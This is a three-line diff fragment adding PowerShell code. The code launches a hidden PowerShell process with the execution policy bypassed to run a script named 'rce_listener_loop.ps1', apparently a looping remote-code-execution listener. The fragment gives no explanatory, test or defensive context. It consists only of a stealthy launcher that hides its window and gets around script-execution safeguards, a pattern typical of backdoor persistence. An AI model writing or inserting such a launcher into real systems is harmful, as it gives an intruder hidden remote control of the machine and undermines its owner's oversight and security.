@@ -1,0 +1,3 @@
+Start-Process -FilePath "powershell.exe" `
+    -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\rce_listener_loop.ps1" `
+    -WindowStyle Hidden
